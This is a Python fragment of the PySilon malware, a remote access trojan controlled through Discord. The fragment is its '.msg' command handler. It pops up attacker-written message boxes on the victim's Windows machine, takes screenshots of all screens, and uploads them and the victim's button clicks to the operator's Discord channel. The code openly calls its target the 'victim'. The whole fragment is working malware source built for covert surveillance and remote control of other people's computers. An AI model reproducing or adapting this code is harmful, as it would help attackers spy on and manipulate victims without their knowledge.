from html2image import Html2Image
from PIL import Image
import ctypes
import os
import threading
import asyncio
import subprocess
from PIL import ImageGrab
from getpass import getuser

def send_custom_message(title, text, style, channel_obj, loop):
    response = ctypes.windll.user32.MessageBoxW(0, text, title, style)
    possible_responses = [
        '', 'OK', 'Cancel', 'Abort', 'Retry', 'Ignore',
        'Yes', 'No', '', '', 'Try Again', 'Continue'
    ]
    str_response = possible_responses[response] if response < len(possible_responses) else f'Code {response}'
    
    embed = discord.Embed(
        title="📧 User responded!",
        description=f'The response for Message(title="{title}", text="{text}", style={style})\nis:```{str_response}```',
        colour=discord.Colour.green()
    )
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    
    asyncio.run_coroutine_threadsafe(channel_obj.send(embed=embed), loop)

elif str(reaction) == '✅':
    if 'custom_message_to_send' in globals() and custom_message_to_send[0] is not None:
        loop = asyncio.get_running_loop()
        threading.Thread(
            target=send_custom_message,
            args=(custom_message_to_send[0], custom_message_to_send[1], custom_message_to_send[2], reaction.message.channel, loop),
            daemon=True
        ).start()
        
        await asyncio.sleep(0.5)
        ss_folder = f'C:\\Users\\{getuser()}\\{software_directory_name}'
        os.makedirs(ss_folder, exist_ok=True)
        ss_path = os.path.join(ss_folder, 'ss.png')
        
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(ss_path)
        
        file = discord.File(ss_path, filename='ss.png')
        embed = discord.Embed(title=f'{current_time()} `[Sent message]`', color=0x0084ff)
        embed.set_image(url='attachment://ss.png')
        
        reaction_msg = await reaction.message.channel.send(embed=embed, file=file)
        await reaction_msg.add_reaction('📌')
        
        if os.path.exists(ss_path):
            os.remove(ss_path)

elif message.content.startswith('.msg'):
    await message.delete()
    
    if not message.content.startswith('.msg ') or 'text="' not in message.content:
        embed = discord.Embed(
            title="📛 Error",
            description='```Syntax: .msg text="<text>" [title="<title>"] [style=<0-6>] [/s]\n  - default title is "From: Someone"\n  - default style is 0. Styles:\n    0 : OK\n    1 : OK | Cancel\n    2 : Abort | Retry | Ignore\n    3 : Yes | No | Cancel\n    4 : Yes | No\n    5 : Retry | Cancel\n    6 : Cancel | Try Again | Continue```',
            colour=discord.Colour.red()
        )
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        reaction_msg = await message.channel.send(embed=embed)
        await reaction_msg.add_reaction('🔴')
    else:
        message_title = 'From: Someone'
        message_style = 0
        message_text = ''
        
        try:
            message_text = message.content.split('text="')[1].split('"')[0]
        except IndexError:
            pass

        if 'title="' in message.content:
            try:
                message_title = message.content.split('title="')[1].split('"')[0]
            except IndexError:
                pass

        if 'style=' in message.content:
            try:
                style_part = message.content.split('style=')[1].split()[0]
                message_style = int(style_part)
            except (IndexError, ValueError):
                message_style = 0

        if message.content.strip().endswith('/s'):
            loop = asyncio.get_running_loop()
            threading.Thread(
                target=send_custom_message,
                args=(message_title, message_text, message_style, message.channel, loop),
                daemon=True
            ).start()
            
            await asyncio.sleep(0.5)
            ss_folder = f'C:\\Users\\{getuser()}\\{software_directory_name}'
            os.makedirs(ss_folder, exist_ok=True)
            ss_path = os.path.join(ss_folder, 'ss.png')
            
            screenshot = ImageGrab.grab(all_screens=True)
            screenshot.save(ss_path)
            
            file = discord.File(ss_path, filename='ss.png')
            embed = discord.Embed(title=f'{current_time()} `[Sent message]`', color=0x0084ff)
            embed.set_image(url='attachment://ss.png')
            
            reaction_msg = await message.channel.send(embed=embed, file=file)
            await reaction_msg.add_reaction('📌')
            
            if os.path.exists(ss_path):
                os.remove(ss_path)
        else:
            work_dir = f'C:\\Users\\{getuser()}\\{software_directory_name}'
            os.makedirs(work_dir, exist_ok=True)
            img_path = os.path.join(work_dir, 'image.png')
            
            def generate_preview():
                hti = Html2Image(output_path=work_dir)
                possible_styles = [
                    '<div class="active_button">OK</div>',
                    '<div class="button">Cancel</div><div class="active_button">OK</div>', 
                    '<div class="button">Ignore</div><div class="button">Retry</div><div class="active_button">Abort</div>',
                    '<div class="button">Cancel</div><div class="button">No</div><div class="active_button">Yes</div>',
                    '<div class="button">No</div><div class="active_button">Yes</div>',
                    '<div class="button">Cancel</div><div class="active_button">Retry</div>',
                    '<div class="button">Continue</div><div class="button">Try Again</div><div class="active_button">Cancel</div>'
                ]
                
                selected_style = possible_styles[message_style] if 0 <= message_style < len(possible_styles) else possible_styles[0]
                
                html_content = f'''<head><style>body {{margin: 0px;}}.container {{width: 285px;min-height: 100px;background-color: #ffffff;border: 1px solid black;}}.title {{margin: 8px;width: 85%;font-size: 13.25px;font-family: 'Calibri';float: left;overflow: hidden;white-space: nowrap;text-overflow: ellipsis;}}.close {{float: right;font-size: 9px;padding: 8px;}}.text {{margin-left: 10px;margin-top: 20px;margin-bottom: 25px;float: left;inline-size: 90%;word-break: break-all;font-size: 13px;font-family: 'Calibri';}}.footer {{background-color: #f0f0f0;width: auto;height: 40px;padding-right: 12px;clear: both;}}.button {{background-color: #e1e1e1;border: 1px solid #adadad;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}}.active_button {{background-color: #e1e1e1;border: 2px solid #0078d7;font-size: 13px;font-family: 'Calibri';float: right;padding-top: 2px;padding-bottom: 2px;margin: 5px;margin-top: 10px;width: 70px;text-align: center;}}</style></head><body><div class="container"><div class="title">{message_title}</div><div class="close"><b>&#9587;</b></div><div class="text">{message_text}</div><div class="footer">{selected_style}</div></div></body></html>'''
                
                hti.screenshot(html_str=html_content, size=(500, 300), save_as='image.png')
                
                if os.path.exists(img_path):
                    with Image.open(img_path) as img:
                        bbox = img.getbbox()
                        if bbox:
                            cropped_img = img.crop(bbox)
                            cropped_img.save(img_path)

            loop = asyncio.get_running_loop()
            await loop.run_in_executor(None, generate_preview)

            if os.path.exists(img_path):
                file = discord.File(img_path, filename='image.png')
                embed = discord.Embed(title='Confirm message', description='Check if message preview meets your expectations:', colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                embed.set_image(url='attachment://image.png')
                embed.set_footer(text='Note: you will see what button did victim click.')
                
                reaction_msg = await message.channel.send(file=file, embed=embed)
                await reaction_msg.add_reaction('✅')
                await reaction_msg.add_reaction('🔴')
                
                if os.path.exists(img_path):
                    os.remove(img_path)
                
                await message.channel.send('```^ React with ✅ to send the message```')
                custom_message_to_send = [message_title, message_text, message_style]
